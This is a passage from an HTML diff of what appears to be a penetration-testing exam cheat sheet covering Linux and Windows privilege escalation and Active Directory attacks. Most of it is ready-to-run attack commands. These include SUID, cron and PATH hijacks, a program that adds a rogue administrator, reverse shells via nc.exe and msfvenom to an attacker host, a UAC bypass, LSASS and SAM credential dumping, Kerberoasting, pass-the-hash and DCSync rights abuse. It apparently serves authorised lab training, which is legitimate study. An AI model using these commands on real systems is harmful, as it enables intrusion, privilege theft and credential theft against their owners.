+cp /tmp/p /etc/passwd        # (with SUID cp)  →  su r00t
+</code></pre>
+<p>Unknown (custom) SUID binary: look at the commands it runs with <code>strings</code> / <code>ltrace</code> → if it calls something without a full path, <strong>PATH hijack</strong>:</p>
+<pre><code class="language-bash">strings /usr/local/bin/backup | less
+echo -e '#!/bin/bash\n/bin/bash -p' &gt; /tmp/tar; chmod +x /tmp/tar
+PATH=/tmp:$PATH /usr/local/bin/backup
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>Exploitation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cap_setuid+ep</code> (python/perl/node…)</td>
+<td><code>python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'</code></td>
+</tr>
+<tr>
+<td><code>cap_dac_read_search</code></td>
+<td>Read any file (<code>/etc/shadow</code>, root's SSH key)</td>
+</tr>
+<tr>
+<td><code>cap_dac_override</code></td>
+<td>Write any file (<code>/etc/passwd</code>)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="en-cron">8.4 Cron and scheduled jobs</h2>
+<pre><code class="language-bash">cat /etc/crontab /etc/cron.d/*; ls -la /etc/cron.*
+./pspy64                        # catch root jobs that do not show up in crontab
+</code></pre>
+<ul>
+<li><strong>A script run by root is writable:</strong> <code>echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' &gt;&gt; /path/script.sh</code> → wait → <code>/tmp/rb -p</code></li>
+<li><strong>The script calls a command without a full path</strong> and a writable directory comes first in the crontab <code>PATH</code> → put a script with the same name in that directory.</li>
+<li><strong>Wildcard:</strong> <code>cd /var/backups &amp;&amp; tar czf /tmp/b.tgz *</code></li>
+</ul>
+<pre><code class="language-bash">cd /var/backups
+echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' &gt; x.sh
+touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'
+</code></pre>
+<h2 id="en-linux-groups">8.5 Groups</h2>
+<p>Check the groups in the <code>id</code> output:</p>
+<table>
+<thead>
+<tr>
+<th>Group</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>docker</code></td>
+<td><code>docker run -v /:/mnt --rm -it &lt;existing image&gt; chroot /mnt bash</code> (get the image name with <code>docker images</code>)</td>
+</tr>
+<tr>
+<td><code>lxd</code> / <code>lxc</code></td>
+<td>Import an Alpine image, <code>security.privileged=true</code>, mount <code>/</code></td>
+</tr>
+<tr>
+<td><code>disk</code></td>
+<td><code>debugfs /dev/sda1</code> → <code>cat /root/.ssh/id_rsa</code></td>
+</tr>
+<tr>
+<td><code>adm</code></td>
+<td>Read <code>/var/log/*</code> → passwords in logs</td>
+</tr>
+<tr>
+<td><code>shadow</code></td>
+<td>Read <code>/etc/shadow</code> → crack</td>
+</tr>
+<tr>
+<td><code>sudo</code> / <code>wheel</code></td>
+<td>Root straight away if you find the user's password</td>
+</tr>
+</tbody>
+</table>
+<h2 id="en-nfs">8.6 NFS no_root_squash</h2>
+<pre><code class="language-bash"># On the target: cat /etc/exports   →  /srv/share *(rw,no_root_squash)
+# On Kali (as root):
+sudo mount -t nfs -o vers=3 $IP:/srv/share /mnt/nfs
+cat &gt; /tmp/r.c &lt;&lt;'EOF'
+#include &lt;unistd.h&gt;
+int main(){ setuid(0); setgid(0); execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-p&quot;,NULL); }
+EOF
+sudo gcc -static /tmp/r.c -o /mnt/nfs/r &amp;&amp; sudo chmod +s /mnt/nfs/r
+# On the target:
+/srv/share/r
+</code></pre>
+<p>(Compiling with <code>-static</code> avoids failures caused by different glibc versions on Kali and the target. That is also why copying Kali's <code>/bin/bash</code> often fails.)</p>
+<h2 id="en-kernel">8.7 Kernel and known local CVEs (last resort)</h2>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Target</th>
+<th>Condition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2021-4034 PwnKit</td>
+<td>pkexec</td>
+<td>polkit &lt; 0.120 (almost every distribution before early 2022)</td>
+</tr>
+<tr>
+<td>CVE-2021-3156 Baron Samedit</td>
+<td>sudo</td>
+<td>1.8.2–1.8.31p2, 1.9.0–1.9.5p1</td>
+</tr>
+<tr>
+<td>CVE-2022-0847 Dirty Pipe</td>
+<td>kernel</td>
+<td>5.8 ≤ version &lt; 5.16.11 / 5.15.25 / 5.10.102</td>
+</tr>
+<tr>
+<td>CVE-2023-2640 + 32629 GameOverlay</td>
+<td>Ubuntu kernel</td>
+<td>Specific Ubuntu kernels (OverlayFS)</td>
+</tr>
+<tr>
+<td>CVE-2023-4911 Looney Tunables</td>
+<td>glibc</td>
+<td>2.34–2.38 (unpatched)</td>
+</tr>
+<tr>
+<td>CVE-2016-5195 Dirty COW</td>
+<td>kernel</td>
+<td>&lt; 4.8.3 (old targets)</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash">uname -r; cat /etc/os-release; dpkg -l | grep -E 'policykit|sudo |libc6'
+./linux-exploit-suggester.sh
+</code></pre>
+<p>A kernel exploit can crash the machine → try everything else first, and collect your proof (local.txt) before running it. If the machine crashes you need a <strong>revert</strong> from the panel (at most 24; the counter can be reset once).</p>
+<h2 id="en-linux-decision">8.8 Linux privesc decision table</h2>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo -l</code> returns something</td>
+<td>GTFOBins "Sudo" / write to the script / LD_PRELOAD</td>
+</tr>
+<tr>
+<td>Non-standard SUID</td>
+<td>GTFOBins "SUID"; for a custom binary, strings + PATH hijack</td>
+</tr>
+<tr>
+<td>Capability</td>
+<td>Table in 8.3</td>
+</tr>
+<tr>
+<td>Root cron + writable script / wildcard</td>
+<td>8.4</td>
+</tr>
+<tr>
+<td>docker/lxd/disk group</td>
+<td>8.5</td>
+</tr>
+<tr>
+<td>Service on 127.0.0.1</td>
+<td>Port forward → web application / DB</td>
+</tr>
+<tr>
+<td>Password in a config file</td>
+<td><code>su root</code>, <code>su &lt;other user&gt;</code></td>
+</tr>
+<tr>
+<td>NFS no_root_squash</td>
+<td>8.6</td>
+</tr>
+<tr>
+<td>Old kernel / sudo / polkit</td>
+<td>8.7 (last resort)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="en-windows-privesc">9. Windows privilege escalation</h1>
+<h2 id="en-windows-checklist">9.1 Ordered checklist</h2>
+<pre><code class="language-powershell">whoami /priv                  # 1) SeImpersonate etc. → 9.5
+whoami /groups                # 2) Administrators (UAC?), Backup Operators, Server Operators, DnsAdmins
+net user &lt;yourself&gt;; net localgroup administrators
+systeminfo                    # 3) OS version, patches, architecture
+# 4) Passwords (9.2) — THE MOST PRODUCTIVE
+# 5) Services (9.3)
+Get-CimInstance win32_service | ?{$_.PathName -notlike &quot;C:\Windows*&quot;} | select Name,StartName,State,StartMode,PathName
+# 6) Scheduled tasks
+schtasks /query /fo LIST /v | findstr /i &quot;TaskName Run.As Task.To.Run&quot;
+# 7) Installed software and interesting directories
+Get-ItemProperty &quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select DisplayName,DisplayVersion
+dir C:\ ; dir &quot;C:\Program Files&quot; ; dir &quot;C:\Program Files (x86)&quot; ; dir C:\Users\*\Desktop
+netstat -ano | findstr LISTENING       # 8) services reachable only from inside
+</code></pre>
+<p>Then the automated tools: <code>.\winPEASx64.exe</code> and <code>. .\PowerUp.ps1; Invoke-AllChecks</code> — <strong>verify the findings of both manually.</strong></p>
+<h2 id="en-cred-hunting">9.2 Credential hunting (the most productive Windows privesc)</h2>
+<pre><code class="language-powershell"># PowerShell history (for every user)
+Get-History
+type (Get-PSReadlineOption).HistorySavePath
+dir C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# PowerShell transcript files
+dir C:\ -Recurse -Include *transcript*.txt -ErrorAction SilentlyContinue
+# Interesting files
+Get-ChildItem C:\Users -Include *.txt,*.ini,*.xml,*.config,*.kdbx,*.ps1,*.zip -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+findstr /si /m &quot;password&quot; C:\inetpub\*.config C:\xampp\*.ini C:\Users\*.txt 2&gt;nul
+# Registry / auto logon
+reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; | findstr /i &quot;Default&quot;
+reg query HKLM /f password /t REG_SZ /s 2&gt;nul | findstr /i &quot;password&quot;
+# Setup leftovers
+type C:\Windows\Panther\Unattend.xml ; type C:\Windows\Panther\unattend\Unattend.xml
+# Saved credentials
+cmdkey /list        # if present:  runas /savecred /user:&lt;user&gt; &quot;C:\Windows\Temp\rev.exe&quot;
+</code></pre>
+<p>Passwords can also show up in Event Viewer → PowerShell Operational → <strong>Script Block Logging (4104)</strong> records:
+<code>Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | ?{$_.Id -eq 4104} | select -First 50 -Expand Message</code></p>
+<h2 id="en-services">9.3 Services</h2>
+<p><strong>(a) The service binary is writable (binary hijacking):</strong></p>
+<pre><code class="language-powershell">icacls &quot;C:\Program Files\App\svc.exe&quot;         # (F) or (M) for one of your groups? (BUILTIN\Users, Everyone, Authenticated Users)
+</code></pre>
+<pre><code class="language-c">// adduser.c  →  x86_64-w64-mingw32-gcc adduser.c -o svc.exe
+#include &lt;stdlib.h&gt;
+int main(){ system(&quot;net user hacker Passw0rd! /add&quot;); system(&quot;net localgroup administrators hacker /add&quot;); return 0; }
+</code></pre>
+<pre><code class="language-powershell">move &quot;C:\Program Files\App\svc.exe&quot; C:\Windows\Temp\svc.bak
+iwr http://<span class="ph">LHOST</span>/svc.exe -OutFile &quot;C:\Program Files\App\svc.exe&quot;
+Restart-Service App        # if not permitted and StartMode=Auto:  shutdown /r /t 0  (needs SeShutdownPrivilege)
+</code></pre>
+<p>(If you want a reverse shell, use <code>msfvenom ... -f exe-service</code>; a plain <code>-f exe</code> dies within seconds when started as a service.)</p>
+<p><strong>(b) The service configuration can be changed:</strong></p>
+<pre><code class="language-powershell">.\accesschk64.exe /accepteula -uwcqv $env:USERNAME *     # SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS
+sc.exe qc &lt;svc&gt;
+sc.exe config &lt;svc&gt; binPath= &quot;C:\Windows\Temp\nc.exe -e cmd.exe <span class="ph">LHOST</span> 443&quot;
+sc.exe stop &lt;svc&gt;; sc.exe start &lt;svc&gt;
+</code></pre>
+<p><strong>(c) Unquoted service path:</strong></p>
+<pre><code class="language-powershell">wmic service get name,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;
+# C:\Program Files\My App\Bin\svc.exe  →  in order:  C:\Program.exe, C:\Program Files\My.exe, C:\Program Files\My App\Bin.exe
+icacls &quot;C:\Program Files\My App&quot;        # drop an exe with the matching name into a writable directory, restart the service
+</code></pre>
+<p><strong>(d) DLL hijacking:</strong> if a service/application looks for a missing DLL in a writable directory (<code>NAME NOT FOUND</code> in Process Monitor; usually not available on the target → study the same application in your own Windows VM):</p>
+<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f dll -o hijack.dll
+</code></pre>
+<h2 id="en-tasks">9.4 Scheduled tasks and AlwaysInstallElevated</h2>
+<pre><code class="language-powershell">schtasks /query /fo LIST /v | findstr /i &quot;TaskName Run.As Task.To.Run&quot;
+icacls C:\path\to\task.ps1          # if it is writable and &quot;Run As&quot; is a privileged account → change its contents
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# If both are 0x1:
+msiexec /quiet /qn /i C:\Windows\Temp\rev.msi
+</code></pre>
+<h2 id="en-privileges">9.5 Privileges (whoami /priv)</h2>
+<table>
+<thead>
+<tr>
+<th>Privilege</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SeImpersonatePrivilege</strong></td>
+<td>The Potato family (very common on IIS, MSSQL and service accounts)</td>
+</tr>
+<tr>
+<td>SeBackupPrivilege</td>
+<td>Copy SAM/SYSTEM; <code>ntds.dit</code> on a DC (below)</td>
+</tr>
+<tr>
+<td>SeRestorePrivilege</td>
+<td>Write to protected files (e.g. replace <code>utilman.exe</code>)</td>
+</tr>
+<tr>
+<td>SeManageVolumePrivilege</td>
+<td><code>SeManageVolumeExploit.exe</code> → write to C:\ → DLL hijack</td>
+</tr>
+<tr>
+<td>SeTakeOwnershipPrivilege</td>
+<td><code>takeown</code> + <code>icacls</code> → replace a system file</td>
+</tr>
+<tr>
+<td>SeDebugPrivilege</td>
+<td>LSASS dump / injection into a SYSTEM process</td>
+</tr>
+<tr>
+<td>SeLoadDriverPrivilege</td>
+<td>Vulnerable driver (Capcom) — rare</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-powershell"># SeImpersonate
+.\PrintSpoofer64.exe -i -c powershell.exe                 # Win10 / Server 2016-2019
+.\PrintSpoofer64.exe -c &quot;C:\Windows\Temp\nc.exe <span class="ph">LHOST</span> 443 -e cmd&quot;
+.\GodPotato-NET4.exe -cmd &quot;C:\Windows\Temp\nc.exe <span class="ph">LHOST</span> 443 -e cmd&quot;   # Server 2012–2022 / Win8–11
+.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a &quot;/c C:\Windows\Temp\nc.exe <span class="ph">LHOST</span> 443 -e cmd&quot;
+</code></pre>
+<p>If one Potato does not work, try another; pick the <code>.NET</code> build (<code>GodPotato-NET2/NET35/NET4</code>) to match the target.</p>
+<p><strong>SeBackupPrivilege (member server):</strong></p>
+<pre><code class="language-powershell">reg save HKLM\SAM C:\Windows\Temp\sam ; reg save HKLM\SYSTEM C:\Windows\Temp\system
+# Kali:  impacket-secretsdump -sam sam -system system LOCAL
+</code></pre>
+<p><strong>SeBackupPrivilege / Backup Operators (DC → ntds.dit):</strong></p>
+<pre><code class="language-text"># diskshadow.txt (with Windows line endings: unix2dos)
+set context persistent nowriters
+add volume c: alias x
+create
+expose %x% z:
+</code></pre>
+<pre><code class="language-powershell">diskshadow /s C:\Windows\Temp\diskshadow.txt
+robocopy /b z:\Windows\NTDS C:\Windows\Temp ntds.dit
+reg save HKLM\SYSTEM C:\Windows\Temp\system
+# Kali:  impacket-secretsdump -ntds ntds.dit -system system LOCAL
+</code></pre>
+<h2 id="en-windows-groups">9.6 Groups</h2>
+<table>
+<thead>
+<tr>
+<th>Group</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Administrators but Medium integrity</td>
+<td>UAC bypass (9.7)</td>
+</tr>
+<tr>
+<td>Backup Operators</td>
+<td>9.5 (SAM / ntds.dit)</td>
+</tr>
+<tr>
+<td>Server Operators</td>
+<td>Change a service with <code>sc.exe config &lt;svc&gt; binPath=</code>, start it → SYSTEM</td>
+</tr>
+<tr>
+<td>DnsAdmins</td>
+<td><code>dnscmd /config /serverlevelplugindll \\LHOST\share\x.dll</code> + restart the DNS service</td>
+</tr>
+<tr>
+<td>Event Log Readers</td>
+<td>Command-line passwords in the security logs (4688)</td>
+</tr>
+<tr>
+<td>Remote Management Users</td>
+<td>Right to log in with evil-winrm</td>
+</tr>
+</tbody>
+</table>
+<h2 id="en-uac">9.7 UAC bypass (Administrators member + Medium integrity)</h2>
+<pre><code class="language-powershell">whoami /groups | findstr Label         # Medium Mandatory Level → UAC
+New-Item &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Force
+New-ItemProperty &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name DelegateExecute -Value &quot;&quot; -Force
+Set-ItemProperty &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value &quot;C:\Windows\Temp\nc.exe <span class="ph">LHOST</span> 443 -e cmd.exe&quot; -Force
+Start-Process C:\Windows\System32\fodhelper.exe
+</code></pre>
+<p>Simpler if you know the password: log in over RDP and "Run as administrator" — or <code>RunasCs.exe user pass cmd.exe -r LHOST:443 --bypass-uac</code>.</p>
+<h2 id="en-post-admin">9.8 After Admin/SYSTEM (not just the flag!)</h2>
+<pre><code class="language-powershell"># Local hashes
+reg save HKLM\SAM C:\Windows\Temp\sam; reg save HKLM\SYSTEM C:\Windows\Temp\system; reg save HKLM\SECURITY C:\Windows\Temp\security
+# Credentials in memory (CRITICAL in the AD set: the key to the next machine is usually here)
+.\mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;lsadump::secrets&quot; &quot;exit&quot;
+</code></pre>
+<pre><code class="language-bash"># Remotely from Kali (with local admin credentials)
+impacket-secretsdump $DOMAIN/$USER:$PASS@$IP
+nxc smb $IP -u administrator -H &lt;NTLM&gt; --local-auth --sam --lsa
+nxc smb $IP -u $USER -p $PASS -M lsassy
+</code></pre>
+<p>If Defender deletes mimikatz: <code>rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;lsass PID&gt; C:\Windows\Temp\l.dmp full</code> (administrator PowerShell) → <code>pypykatz lsa minidump l.dmp</code> on Kali.</p>
+<p>Then: user desktops/documents, <code>.kdbx</code>, browser/application configs, <code>ipconfig /all</code> (a second NIC = pivot), <code>cmdkey /list</code>.</p>
+<h2 id="en-legacy">9.9 Old / unpatched systems</h2>
+<p>Run the <code>systeminfo</code> output through <code>wes.py systeminfo.txt --impact "Elevation of Privilege"</code> on Kali. Classics: MS17-010 (2008/7), PrintNightmare CVE-2021-34527/1675 (if the Spooler is running), HiveNightmare CVE-2021-36934 (<code>icacls C:\Windows\System32\config\SAM</code> → <code>BUILTIN\Users:(RX)</code>).</p>
+<h2 id="en-windows-decision">9.10 Windows privesc decision table</h2>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SeImpersonate</td>
+<td>GodPotato / PrintSpoofer / JuicyPotatoNG</td>
+</tr>
+<tr>
+<td>Password in history/config/kdbx</td>
+<td>RunasCs / evil-winrm / RDP</td>
+</tr>
+<tr>
+<td>Writable service binary</td>
+<td>Replace + restart / reboot</td>
+</tr>
+<tr>
+<td>Service config permission</td>
+<td><code>sc config binPath</code></td>
+</tr>
+<tr>
+<td>Unquoted path + writable directory</td>
+<td>An exe with the matching name</td>
+</tr>
+<tr>
+<td>Writable task script</td>
+<td>Change its contents</td>
+</tr>
+<tr>
+<td>AlwaysInstallElevated</td>
+<td>MSI</td>
+</tr>
+<tr>
+<td>Admin group + Medium</td>
+<td>fodhelper UAC bypass</td>
+</tr>
+<tr>
+<td>Backup/Server Operators, DnsAdmins</td>
+<td>9.5 / 9.6</td>
+</tr>
+<tr>
+<td>Service listening on <code>localhost</code></td>
+<td>Port forward → investigate</td>
+</tr>
+</tbody>
+</table>
+<h2 id="en-first-10">9.11 Quick reference: the first 10 minutes</h2>
+<pre><code class="language-powershell">whoami /all; hostname; ipconfig /all; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;
+net user; net localgroup administrators; netstat -ano | findstr LISTENING
+Get-History; type (Get-PSReadlineOption).HistorySavePath
+dir C:\Users\*\Desktop, C:\Users\*\Documents -ErrorAction SilentlyContinue
+</code></pre>
+<hr />
+<h1 id="en-ad">10. Active Directory (assumed breach scenario)</h1>
+<h2 id="en-ad-decision">10.1 AD decision tree</h2>
+<pre><code class="language-text">Given user (user:pass) + DC IP
+│
+├─ 1. Validate and map ──────► nxc smb &lt;subnet&gt;  →  which machines, which are unsigned, which names
+├─ 2. Channels ──────────────► try this user on EVERY machine with nxc smb/winrm/rdp/mssql/ldap
+├─ 3. Enum ──────────────────► users + descriptions, groups, shares, BloodHound
+│
+├─ User with an SPN ─────────► Kerberoast → 13100 → password → spray / log in
+├─ Preauth disabled ─────────► AS-REP roast → 18200
+├─ File on a share ──────────► script/config/kdbx/xml → password
+├─ Local admin on a machine ─► mimikatz/secretsdump → new hashes/passwords → back to step 2
+├─ BloodHound ACL edge ──────► ForceChangePassword / GenericAll / GenericWrite / WriteDACL / AddMember
+├─ MSSQL access ─────────────► xp_cmdshell → SeImpersonate → Potato
+├─ Shell on a machine, not admin ► Section 9 (local privesc) → then dump
+└─ DA / SYSTEM on the DC ────► proof.txt (on the DC) + DCSync
+</code></pre>
+<p>Progress in AD is cyclical: <strong>new credential → try it everywhere → new machine → dump → new credential</strong>. With every new credential, mark that user as "Owned" in BloodHound and query the paths again.</p>
+<h2 id="en-ad-first-15">10.2 The first 15 minutes</h2>
+<pre><code class="language-bash"># Time sync (Kerberos tolerates 5 min of skew)
+sudo ntpdate -u $DC          # or: sudo rdate -n $DC
+# DC and domain name
+nxc smb $DC
+echo &quot;$DC dc01.$DOMAIN $DOMAIN dc01&quot; | sudo tee -a /etc/hosts
+# Machines in the subnet
+nxc smb 10.10.x.0/24
+# Try the user everywhere
+nxc smb   10.10.x.0/24 -u $USER -p $PASS
+nxc winrm 10.10.x.0/24 -u $USER -p $PASS
+nxc rdp   10.10.x.0/24 -u $USER -p $PASS
+nxc mssql 10.10.x.0/24 -u $USER -p $PASS
+# Domain data
+nxc smb $DC -u $USER -p $PASS --users --groups --shares --pass-pol
+nxc ldap $DC -u $USER -p $PASS --users-export users.txt     # usernames only
+nxc smb 10.10.x.0/24 -u $USER -p $PASS -M spider_plus        # files on every share
+</code></pre>
+<p>User description fields (<code>description</code>) and scripts in SYSVOL often contain passwords.</p>
+<h2 id="en-bloodhound">10.3 BloodHound</h2>
+<pre><code class="language-bash"># Collect from Kali
+bloodhound-ce-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c All --zip      # for BloodHound CE
+# (If you use BloodHound Legacy: bloodhound-python. The collector and GUI versions MUST match.)
+nxc ldap $DC -u $USER -p $PASS --bloodhound -c All --dns-server $DC
+</code></pre>
+<pre><code class="language-powershell"># From a Windows target
+.\SharpHound.exe -c All --zipfilename bh.zip
+</code></pre>
+<p>Queries to run: <em>Shortest paths to Domain Admins</em>, <em>Shortest paths from Owned principals</em>, <em>Kerberoastable users</em>, <em>AS-REP roastable users</em>, the <strong>Outbound Object Control</strong> of the users you own, <em>Find computers where Domain Users are local admin</em>, <em>Users with sessions</em>.</p>
+<h2 id="en-powerview">10.4 PowerView / built-in enumeration (from a target)</h2>
+<pre><code class="language-powershell">. .\PowerView.ps1
+Get-DomainUser | select samaccountname,description,memberof
+Get-DomainUser -SPN | select samaccountname,serviceprincipalname
+Get-DomainUser -PreauthNotRequired | select samaccountname
+Get-DomainGroupMember &quot;Domain Admins&quot; -Recurse | select MemberName
+Get-DomainComputer | select dnshostname,operatingsystem
+Find-LocalAdminAccess                        # where is this user a local admin?
+Get-NetSession -ComputerName &lt;host&gt;          # who is logged in where
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match &quot;$env:USERNAME&quot;}
+Get-DomainObjectAcl -Identity &lt;target&gt; -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match &quot;GenericAll|GenericWrite|WriteDacl|WriteOwner&quot;}
+# Without tools
+net user /domain ; net group &quot;Domain Admins&quot; /domain ; net accounts /domain
+</code></pre>
+<h2 id="en-roasting">10.5 Kerberoasting and AS-REP roasting</h2>
+<pre><code class="language-bash">impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerb.txt
+impacket-GetNPUsers  $DOMAIN/$USER:$PASS -dc-ip $DC -request -format hashcat -outputfile asrep.txt
+impacket-GetNPUsers  $DOMAIN/ -usersfile users.txt -dc-ip $DC -no-pass -format hashcat     # without credentials
+hashcat -m 13100 kerb.txt  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+<pre><code class="language-powershell">.\Rubeus.exe kerberoast /outfile:kerb.txt /nowrap
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap
+</code></pre>
+<h2 id="en-lateral">10.6 Lateral movement</h2>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Requires</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PsExec</td>
+<td>Local admin, SMB, writable ADMIN$</td>
+<td><code>impacket-psexec $DOMAIN/$USER:$PASS@$IP</code></td>
+</tr>
+<tr>
+<td>WMIExec</td>
+<td>Local admin, 135 + high ports</td>
+<td><code>impacket-wmiexec -hashes :&lt;NTLM&gt; $DOMAIN/$USER@$IP</code></td>
+</tr>
+<tr>
+<td>SMBExec / ATExec</td>
+<td>Local admin</td>
+<td><code>impacket-smbexec ...</code> / <code>impacket-atexec ... whoami</code></td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>Remote Management Users or admin</td>
+<td><code>evil-winrm -i $IP -u $USER -p $PASS</code> / <code>-H &lt;NTLM&gt;</code></td>
+</tr>
+<tr>
+<td>RDP</td>
+<td>Remote Desktop Users</td>
+<td><code>xfreerdp3 /v:$IP /u:$USER /p:$PASS /d:$DOMAIN /cert:ignore</code></td>
+</tr>
+<tr>
+<td>RDP + hash</td>
+<td>Restricted Admin enabled</td>
+<td><code>xfreerdp3 /v:$IP /u:$USER /pth:&lt;NTLM&gt; /cert:ignore</code></td>
+</tr>
+<tr>
+<td>nxc single command</td>
+<td>admin</td>
+<td><code>nxc smb $IP -u $USER -H &lt;NTLM&gt; -x "whoami"</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td>DB access</td>
+<td><code>impacket-mssqlclient ... -windows-auth</code></td>
+</tr>
+</tbody>
+</table>
+<p>Windows to Windows (when you cannot bring tools):</p>
+<pre><code class="language-powershell">winrs -r:files04 -u:$USER -p:$PASS &quot;cmd /c whoami&quot;
+$cred = New-Object System.Management.Automation.PSCredential('CORP\user',(ConvertTo-SecureString 'Pass' -AsPlainText -Force))
+Enter-PSSession -ComputerName files04 -Credential $cred
+.\PsExec64.exe -accepteula \\files04 -u corp\user -p Pass cmd
+</code></pre>
+<p><strong>Overpass-the-hash / Pass-the-ticket:</strong></p>
+<pre><code class="language-bash">impacket-getTGT $DOMAIN/$USER -hashes :&lt;NTLM&gt; -dc-ip $DC
+export KRB5CCNAME=$PWD/$USER.ccache
+impacket-psexec -k -no-pass $DOMAIN/$USER@host.$DOMAIN        # use the FQDN, not the IP
+</code></pre>
+<pre><code class="language-powershell">.\mimikatz.exe &quot;sekurlsa::pth /user:jen /domain:corp.com /ntlm:&lt;NTLM&gt; /run:powershell&quot; &quot;exit&quot;
+.\mimikatz.exe &quot;sekurlsa::tickets /export&quot; &quot;exit&quot; ; .\mimikatz.exe &quot;kerberos::ptt &lt;ticket.kirbi&gt;&quot; &quot;exit&quot;
+</code></pre>
+<h2 id="en-mssql">10.7 MSSQL</h2>
+<pre><code class="language-sql">SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');
+-- shortcuts inside impacket-mssqlclient:  enable_xp_cmdshell  /  xp_cmdshell whoami
+EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami /priv';                         -- service account → SeImpersonate → Potato
+-- Impersonation
+SELECT distinct b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE';
+EXECUTE AS LOGIN = 'sa';
+-- Linked servers
+SELECT srvname FROM sysservers;  EXEC ('xp_cmdshell ''whoami''') AT [SQL02];
+-- Capture the service account's NetNTLMv2 (on Kali: impacket-smbserver share . -smb2support)
+EXEC xp_dirtree '\\<span class="ph">LHOST</span>\share';
+</code></pre>
+<h2 id="en-acl">10.8 ACL abuse (BloodHound edges)</h2>
+<table>
+<thead>
+<tr>
+<th>Edge (on the target)</th>
+<th>Attack</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ForceChangePassword</td>
+<td>Change their password</td>
+</tr>
+<tr>
+<td>GenericAll (user)</td>
+<td>Change the password / add an SPN → kerberoast</td>
+</tr>
+<tr>
+<td>GenericAll / AddMember (group)</td>
+<td>Add yourself to the group</td>
+</tr>
+<tr>
+<td>GenericWrite (user)</td>
+<td>Add an SPN (targeted kerberoast)</td>
+</tr>
+<tr>
+<td>WriteDACL (domain)</td>
+<td>Grant yourself DCSync rights</td>
+</tr>
+<tr>
+<td>WriteOwner</td>
+<td>Become the owner → grant yourself GenericAll</td>
+</tr>
+<tr>
+<td>ReadLAPSPassword</td>
+<td>Read the machine's local admin password</td>
+</tr>
+<tr>
+<td>ReadGMSAPassword</td>
+<td>Read the gMSA account's NT hash</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash"># bloodyAD (from Kali, very practical)
+bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC set password &lt;target&gt; 'NewPass123!'
+bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC add groupMember '&lt;group&gt;' $USER
+bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC add dcsync $USER
+bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC set owner &lt;target&gt; $USER
+bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC add genericAll &lt;target&gt; $USER
+# Alternative
+net rpc password '&lt;target&gt;' 'NewPass123!' -U &quot;$DOMAIN/$USER%$PASS&quot; -S $DC
+# Targeted kerberoast (GenericWrite)
